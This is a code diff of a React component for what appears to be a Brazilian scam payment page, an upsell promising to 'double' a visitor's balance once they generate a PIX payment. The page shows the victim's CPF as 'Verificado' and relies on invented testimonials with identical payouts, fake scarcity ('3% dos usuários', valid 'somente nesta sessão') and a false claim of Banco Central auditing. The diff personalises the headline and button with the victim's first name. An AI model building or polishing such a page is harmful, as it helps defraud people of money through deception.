@@ -10,12 +10,13 @@ const FaqItem = ({ question, answer }: { question: string; answer: string }) => 
 const TestimonialCard = ({ img, name, location, text, amount }: { img: string; name: string; location: string; text: string; amount: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} loading="lazy" className="w-8 h-8 rounded-full object-cover" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold">+{amount}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);
 
 const FunnelUpsellSaldoDuplicado = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellSaldoDuplicadoProps) => {
+  const firstName = leadName ? leadName.split(" ")[0] : "";
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
       <div className="bg-[#1B5E20] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">💰 PROMOÇÃO EXCLUSIVA — SALDO EM DOBRO</h1></div>
       <main className="px-3 py-4 max-w-lg mx-auto pb-24">
         {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
-        <div className="bg-[#E8F5E9] border border-[#66BB6A] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">🎯</span><div><p className="text-gray-900 text-sm font-bold mb-1">Você foi selecionado para a promoção Saldo em Dobro</p><p className="text-gray-700 text-xs leading-relaxed">Apenas <span className="font-bold text-green-700">3% dos usuários</span> são elegíveis. Essa oferta é válida somente nesta sessão.</p></div></div></div>
+        <div className="bg-[#E8F5E9] border border-[#66BB6A] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">🎯</span><div><p className="text-gray-900 text-sm font-bold mb-1">{firstName ? `${firstName}, você foi selecionado para a promoção Saldo em Dobro` : "Você foi selecionado para a promoção Saldo em Dobro"}</p><p className="text-gray-700 text-xs leading-relaxed">Apenas <span className="font-bold text-green-700">3% dos usuários</span> são elegíveis. Essa oferta é válida somente nesta sessão.</p></div></div></div>
         <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
           <div className="flex justify-center mb-3"><span className="bg-green-50 text-green-700 text-[10px] font-bold px-3 py-1 rounded-full border border-green-200 animate-pulse">✨ OFERTA LIMITADA — EXPIRA EM BREVE</span></div>
           <div className="grid grid-cols-2 gap-3 mb-4">
@@ -33,7 +34,7 @@ const FunnelUpsellSaldoDuplicado = ({ balance, onGeneratePix, isGenerating, lead
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem duplicou, recebeu em dobro</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Thiago R." location="Goiânia, GO" text="Não acreditei quando vi a oferta de duplicar. Ativei e em 2 minutos caiu o dobro do saldo na minha conta." amount="R$ 5.669,44" /><TestimonialCard img={testimonial2} name="Camila B." location="Fortaleza, CE" text="Quase deixei passar achando que não era real. Minha irmã me convenceu a ativar e recebi tudo duplicado." amount="R$ 5.669,44" /><TestimonialCard img={testimonial3} name="Rafael N." location="Florianópolis, SC" text="Já tinha recebido o saldo normal antes. Dessa vez apareceu a duplicação e eu ativei na hora." amount="R$ 5.669,44" /></div></div>
         <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema de conversão auditado pelo Banco Central</p></div>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="Duplicar Meu Saldo para R$ 5.669,44" bgColor="bg-[#1B5E20]" shadowColor="shadow-green-200" />
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={firstName ? `${firstName.toUpperCase()}, DUPLICAR MEU SALDO` : "Duplicar Meu Saldo para R$ 5.669,44"} bgColor="bg-[#1B5E20]" shadowColor="shadow-green-200" />
     </div>
   );
 };
